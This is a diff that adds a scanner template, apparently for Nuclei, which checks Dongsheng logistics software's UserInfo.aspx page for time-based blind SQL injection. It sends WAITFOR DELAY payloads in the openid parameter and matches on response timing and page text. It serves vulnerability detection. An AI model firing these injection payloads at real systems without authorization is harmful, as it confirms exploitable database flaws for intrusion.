@@ -1,0 +1,28 @@
+id: poc-yaml-dongshengsoft-userinfo-aspx-sqli
+info:
+  name: 东胜物流软件 UserInfo.aspx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 东胜物流软件
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:5%27--"
+      - "{{BaseURL}}/Areas/Mobile/Views/Login/UserInfo.aspx?openid=1%27WAITFOR%20DELAY%20%270:0:8%27--"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "您已关联系统账户"
+          - "审批确认"
+          - "确定要解除系统关联"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
